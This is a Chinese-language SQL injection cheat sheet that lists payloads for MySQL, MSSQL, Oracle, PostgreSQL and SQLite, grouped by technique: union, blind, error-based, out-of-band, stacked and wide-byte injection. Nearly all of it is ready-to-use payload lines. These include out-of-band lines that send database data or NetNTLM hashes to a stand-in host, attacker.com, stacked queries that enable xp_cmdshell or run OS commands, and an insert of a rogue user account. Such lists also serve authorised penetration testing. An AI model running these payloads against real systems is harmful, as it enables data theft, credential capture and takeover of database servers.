## 三、核心注入技术（分类型）

### 3.1 Union注入
**列数确定**：
```sql
' ORDER BY 1--     ' ORDER BY 10--     （二分法）
' UNION SELECT NULL--                   ' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3,4--                （数字占位确定回显位）
```

**无逗号注入**：
```sql
-- 用JOIN代替逗号
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
-- LIMIT无逗号
' LIMIT 1 OFFSET 0--
```

### 3.2 Boolean盲注
```sql
-- 基础
' AND (SELECT SUBSTRING(VERSION(),1,1))='5'--
' AND (SELECT ASCII(SUBSTRING(VERSION(),1,1)))=53--

-- 无SUBSTRING（MySQL）
' AND MID(VERSION(),1,1)='5'--
' AND LEFT(VERSION(),1)='5'--
' AND ORD(MID(VERSION(),1,1))=53--

-- 用正则替代等号
' AND VERSION() REGEXP '^5'--
' AND VERSION() LIKE '5%'--

-- MSSQL替代
' AND SUBSTRING(VERSION(),1,1)='5'--
' AND ASCII(SUBSTRING(@@VERSION,1,1))=77--   (M开头为Microsoft)
' AND DATALENGTH(DB_NAME())>4--              (替代LEN)
' AND COALESCE(NULL,1)=1--                   (替代ISNULL)

-- Oracle
' AND SUBSTR(USER,1,1)='S'--
' AND ASCII(SUBSTR(USER,1,1))=83--
' AND USER LIKE 'SYS%'--
```

### 3.3 Time-based盲注
```sql
-- MySQL
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--     (CPU繁忙型延迟)
-- MySQL 5.5+
' AND (SELECT TO_SECONDS(NOW())+5=TO_SECONDS(SLEEP(5)+NOW()))--
' AND GET_LOCK('test',5)--                    (MySQL 5.7+)
-- MySQL 8.0高级
' AND (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1 WHERE 1=1 AND SLEEP(5))))--

-- MSSQL
' WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

-- Oracle (无原生SLEEP，使用以下方案)
' AND DBMS_LOCK.SLEEP(5)--                    (需要权限)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--    (PUBLIC权限可用)
' AND (SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<=10000000)>0-- (重型查询延迟)
' AND NUMTOYMINTERVAL(5,'MONTH') IS NOT NULL-- (11g+)
' AND UTL_HTTP.REQUEST('http://attacker.com') IS NOT NULL-- (HTTP外带)

-- PostgreSQL
' AND PG_SLEEP(5)--
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))>0--

-- SQLite
' AND (SELECT COUNT(*) FROM sqlite_master WHERE randomblob(1000000000))--
```

### 3.4 Error-based报错注入
```sql
-- MySQL (XPath/几何对象/主键重复)
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--
' AND (SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1))a)--
' AND EXP(~(SELECT * FROM (SELECT USER())a))--
' AND GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1)--   (5.6+)
' AND JSON_EXTRACT('{"a":1}',CONCAT('$.',VERSION()))-- (5.7+)
' AND ST_LatFromGeoHash(VERSION())--                   (5.7+)
' AND ST_PointFromGeoHash(VERSION(),1)--               (5.7+)

-- MSSQL (类型转换错误)
' AND CONVERT(INT,(SELECT TOP 1 DB_NAME()))--
' AND CAST((SELECT TOP 1 DB_NAME()) AS INT)--
' AND 1=CTXTS_DOC.PARSE('a')--                          (全文检索)
' AND (SELECT * FROM OPENROWSET('SQLoledb','server';'sa';'pass','SELECT 1'))-- (错误链)
-- MSSQL 2016+ JSON报错
' AND (SELECT 1 FROM OPENJSON(CONCAT('["',@@VERSION,'"]')))--

-- Oracle (类型转换错误)
' AND CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))--
' AND UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL))--
' AND (SELECT CTX_REPORT.TOKEN_TYPE(USER,1) FROM DUAL)--
' AND SYS.DBMS_AQADM.MOVE_QUEUE_TABLE(USER,1)--
-- 11g XMLType报错
' AND (SELECT XMLType('<a>'||USER||'</a>') FROM DUAL)--
-- 12c+ JSON报错
' AND (SELECT JSON_VALUE('{"a":"'||USER||'"}','$.a') FROM DUAL)--

-- PostgreSQL
' AND 1=CAST(VERSION() AS INT)--
' AND (SELECT 1 FROM PG_EXPANDARRAY(('{'||CURRENT_USER||'}')::TEXT[]))--
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,1) WHERE CAST(VERSION() AS INT)=1)--

-- SQLite
' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) GROUP BY 1 HAVING 1=1)--
' AND CAST(HEX(RANDOMBLOB(1000000000)) AS INTEGER)--
```

### 3.5 Out-of-Band外带注入（盲注替代）
```sql
-- DNS外带（最通用）
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\',(SELECT VERSION()),'.attacker.com\\a'))--
-- MSSQL
'; EXEC master..xp_dirtree '\\'+@@VERSION+'.attacker.com\a'--
'; DECLARE @a VARCHAR(1024);SET @a=@@VERSION;EXEC('master..xp_dirtree "\\'+@a+'.attacker.com\a"')--
-- Oracle
' AND UTL_HTTP.REQUEST('http://'||USER||'.attacker.com/') IS NOT NULL--
' AND UTL_INADDR.GET_HOST_ADDRESS(USER||'.attacker.com') IS NOT NULL--
' AND DBMS_LDAP.INIT((SELECT USER FROM DUAL)||'.attacker.com',80) IS NOT NULL--

-- HTTP外带
-- MySQL（需FILE权限）
' AND (SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a')))--
-- MSSQL OLE Automation
'; DECLARE @o INT;EXEC sp_oacreate 'MSXML2.ServerXMLHTTP',@o OUT;EXEC sp_oamethod @o,'open',null,'GET','http://attacker.com/?d='+@@VERSION;EXEC sp_oamethod @o,'send'--

-- SMB哈希捕获（Responder）
-- MSSQL：强制SMB认证获取NetNTLM Hash
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### 3.6 堆叠注入（Stacked Queries）
```sql
-- MSSQL（默认支持多语句）
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
'; INSERT INTO users(username,password) VALUES('hacker','p@ss')--

-- MySQL（需multi_statements=on，PHP默认PDO支持/mysqli需指定）
'; INSERT INTO users VALUES('hacker','p@ss');--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; CREATE TABLE cmd(out text);COPY cmd FROM PROGRAM 'id';--
```

### 3.7 宽字节注入
```sql
%bf%27  →  %bf%5c%27（MySQL GBK中%bf%5c为合法宽字符"縗"，%27逃逸）
%df%27  →  運'
%aa%27  →  使用不同高位字节（0x81-0xFE）测试
-- 典型场景：PHP addslashes()/magic_quotes_gpc + GBK编码
%df' OR 1=1--
```

